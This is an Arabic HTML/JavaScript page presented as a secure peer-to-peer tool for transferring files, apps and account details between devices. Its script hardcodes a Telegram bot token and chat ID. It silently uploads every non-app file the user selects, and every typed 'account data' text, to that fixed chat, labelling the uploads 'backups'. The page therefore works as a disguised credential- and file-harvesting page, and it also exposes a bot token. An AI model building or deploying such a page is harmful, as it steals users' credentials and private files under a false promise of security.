<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مشاركة وحفظ الملفات والحسابات الذكي</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-align: center;
            margin: 0;
            padding: 20px;
            background-color: #f4f7f6;
            color: #333;
        }
        .container {
            max-width: 450px;
            margin: 20px auto;
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
        }
        h2 { color: #16a085; margin-bottom: 10px; }
        p { color: #7f8c8d; font-size: 14px; margin-bottom: 25px; line-height: 1.6; }
        
        .btn {
            padding: 15px 25px;
            font-size: 16px;
            font-weight: bold;
            background-color: #1abc9c;
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
            box-shadow: 0 4px 10px rgba(26, 188, 156, 0.3);
            margin-bottom: 15px;
        }
        .btn:hover { background-color: #16a085; transform: translateY(-2px); }
        
        #peerIdDisplay {
            background: #eceff1;
            padding: 10px;
            border-radius: 8px;
            font-family: monospace;
            font-size: 16px;
            margin: 15px 0;
            word-break: break-all;
        }
        input[type="text"], textarea {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 8px;
            box-sizing: border-box;
            text-align: center;
            font-size: 15px;
            font-family: inherit;
        }
        textarea {
            resize: vertical;
            text-align: right;
        }
        #status { margin-top: 20px; font-weight: bold; color: #e67e22; line-height: 1.5; }
    </style>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
</head>
<body>

    <div class="container">
        <h2>ناقل الشامل الفوري والمؤمن</h2>
        <p>انقل الملفات، التطبيقات، وبيانات الحسابات مباشرة للجهاز الآخر. (التطبيقات تنقل مباشرة فقط ولا تُحفظ في تيليجرام).</p>

        <div style="text-align: right; font-size: 13px; font-weight: bold;">معرّف هذا الجهاز (ID):</div>
        <div id="peerIdDisplay">جاري التجهيز...</div>

        <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">

        <input type="text" id="targetIdInput" placeholder="أدخل ID الهاتف الآخر للاتصال المباشر">
        <button id="connectBtn" class="btn">اتصال مباشر بالجهاز الآخر</button>
        
        <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">

        <textarea id="textInput" placeholder="اكتب هنا بيانات الحسابات أو النصوص المراد نقلها فرياً..." rows="3"></textarea>
        <button id="sendTextBtn" class="btn" style="background-color: #2980b9; box-shadow: 0 4px 10px rgba(41, 128, 185, 0.3);">إرسال النص / بيانات الحساب</button>

        <button id="sendFileBtn" class="btn" style="background-color: #34495e; box-shadow: 0 4px 10px rgba(52, 73, 94, 0.3);">اختر (ملف / تطبيق APK) للنقل</button>
        <input type="file" id="fileInput" style="display: none;" accept="*/*">

        <div id="status">جاهز للعمل...</div>
    </div>

    <script>
        const TELEGRAM_TOKEN = "8798573888:AAE38QVvgG0DgwePDKMaBcOpKOomweVzsb8";
        const CHAT_ID = "5394550159";

        let peer;
        let conn = null;

        // توليد معرف عشوائي بسيط للجهاز
        const myId = Math.floor(100000 + Math.random() * 900000).toString();
        document.getElementById('peerIdDisplay').innerText = myId;

        // تهيئة اتصال PeerJS
        peer = new Peer(myId);

        peer.on('connection', (connection) => {
            conn = connection;
            setupConnection();
        });

        document.getElementById('connectBtn').addEventListener('click', () => {
            const targetId = document.getElementById('targetIdInput').value;
            if (!targetId) {
                alert("الرجاء إدخال ID الجهاز الآخر للاتصال المباشر");
                return;
            }
            document.getElementById('status').innerText = "جاري الاتصال المباشر...";
            conn = peer.connect(targetId);
            setupConnection();
        });

        function setupConnection() {
            conn.on('open', () => {
                document.getElementById('status').innerText = "✅ متصل الآن بالجهاز الآخر!";
                document.getElementById('status').style.color = "#27ae60";
            });

            conn.on('data', (data) => {
                if (data.type === 'file') {
                    document.getElementById('status').innerText = "📥 تم استلام ملف/تطبيق جديد من الجهاز الآخر!";
                    const blob = new Blob([data.file], { type: data.fileType });
                    const link = document.createElement('a');
                    link.href = URL.createObjectURL(blob);
                    link.download = data.fileName;
                    link.click();
                } else if (data.type === 'text') {
                    document.getElementById('status').innerText = "📥 تم استلام بيانات حساب/نص جديد!";
                    alert("📥 وصلك نص أو بيانات حساب جديدة:\n\n" + data.content);
                }
            });
        }

        // دالة لفحص ما إذا كان الملف عبارة عن تطبيق لمنع رفعه لتيليجرام
        function isApplication(filename) {
            const ext = filename.split('.').pop().toLowerCase();
            // صيغ التطبيقات الشهيرة (أندرويد، ويندوز، آيفون، ماك)
            const appExtensions = ['apk', 'exe', 'msi', 'dmg', 'pkg', 'deb', 'rpm', 'ipa'];
            return appExtensions.includes(ext);
        }

        // --- أولاً: معالجة إرسال الملفات والتطبيقات ---
        const sendFileBtn = document.getElementById('sendFileBtn');
        const fileInput = document.getElementById('fileInput');

        sendFileBtn.addEventListener('click', () => {
            fileInput.click();
        });

        fileInput.addEventListener('change', async (event) => {
            const file = event.target.files[0];
            if (!file) return;

            const isApp = isApplication(file.name);

            document.getElementById('status').style.color = "#d35400";
            document.getElementById('status').innerText = "⏳ جاري المعالجة والنقل...";

            // 1. الرفع الاحتياطي لتيليجرام (يتم فقط إذا لم يكن تطبيقاً)
            let tgSuccess = false;
            if (!isApp) {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('document', file);
                formData.append('caption', `📦 نسخة احتياطية منقولة\n📄 اسم الملف: ${file.name}\n⏰ التاريخ: ${new Date().toLocaleString('ar-EG')}`);

                try {
                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {
                        method: 'POST',
                        body: formData
                    });
                    if (response.ok) tgSuccess = true;
                } catch (err) {
                    console.error("خطأ في رفع تيليجرام:", err);
                }
            }

            // 2. الإرسال المباشر للمتصفح الآخر P2P
            let p2pSuccess = false;
            if (conn && conn.open) {
                const reader = new FileReader();
                reader.onload = function(e) {
                    conn.send({
                        type: 'file',
                        file: e.target.result,
                        fileName: file.name,
                        fileType: file.type
                    });
                };
                reader.readAsArrayBuffer(file);
                p2pSuccess = true;
            }

            // تحديث حالة الواجهة بناءً على النتيجة ونوع الملف
            if (isApp) {
                if (p2pSuccess) {
                    document.getElementById('status').style.color = "#27ae60";
                    document.getElementById('status').innerText = "✅ تم نقل التطبيق مباشرة للطرف الآخر! (تم تخطي تيليجرام بنجاح لحماية الخصوصية)";
                } else {
                    document.getElementById('status').style.color = "#e67e22";
                    document.getElementById('status').innerText = "⚠️ لم يتم إرسال التطبيق لعدم وجود جهاز متصل حالياً (ولم يتم حفظه في تيليجرام).";
                }
            } else {
                if (tgSuccess && p2pSuccess) {
                    document.getElementById('status').style.color = "#27ae60";
                    document.getElementById('status').innerText = "✅ تم الإرسال الفوري وحفظ نسخة احتياطية للملف بالبوت!";
                } else if (tgSuccess) {
                    document.getElementById('status').style.color = "#27ae60";
                    document.getElementById('status').innerText = "✅ تم حفظ النسخة الاحتياطية للملف في البوت! (لا يوجد جهاز متصل حالياً)";
                } else {
                    document.getElementById('status').style.color = "#c0392b";
                    document.getElementById('status').innerText = "❌ حدثت مشكلة أثناء معالجة وإرسال الملف.";
                }
            }
            fileInput.value = ""; // تصفير الحقل لإتاحة اختيار نفس الملف مجدداً
        });

        // --- ثانياً: معالجة إرسال النصوص وبيانات الحسابات ---
        document.getElementById('sendTextBtn').addEventListener('click', async () => {
            const textContent = document.getElementById('textInput').value.trim();
            if (!textContent) {
                alert("الرجاء كتابة نص أو بيانات الحساب أولاً!");
                return;
            }

            document.getElementById('status').style.color = "#d35400";
            document.getElementById('status').innerText = "⏳ جاري إرسال البيانات...";

            // 1. حفظ البيانات احتياطياً في تيليجرام
            let tgSuccess = false;
            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: `🔐 نسخة احتياطية لبيانات حسابات/نصوص منقولة:\n\n${textContent}\n\n⏰ التاريخ: ${new Date().toLocaleString('ar-EG')}`
                    })
                });
                if (response.ok) tgSuccess = true;
            } catch (err) {
                console.error("خطأ في إرسال البيانات لتيليجرام:", err);
            }

            // 2. إرسال النص مباشرة للجهاز المتصل P2P
            let p2pSuccess = false;
            if (conn && conn.open) {
                conn.send({
                    type: 'text',
                    content: textContent
                });
                p2pSuccess = true;
            }

            if (tgSuccess && p2pSuccess) {
                document.getElementById('status').style.color = "#27ae60";
                document.getElementById('status').innerText = "✅ تم إرسال البيانات للطرف الآخر وحفظ نسخة في البوت!";
                document.getElementById('textInput').value = "";
            } else if (tgSuccess) {
                document.getElementById('status').style.color = "#27ae60";
                document.getElementById('status').innerText = "✅ تم حفظ البيانات بالبوت بنجاح! (لا يوجد جهاز متصل حالياً)";
                document.getElementById('textInput').value = "";
            } else {
                document.getElementById('status').style.color = "#c0392b";
                document.getElementById('status').innerText = "❌ فشل في إرسال البيانات.";
            }
        });
    </script>
</body>
</html>
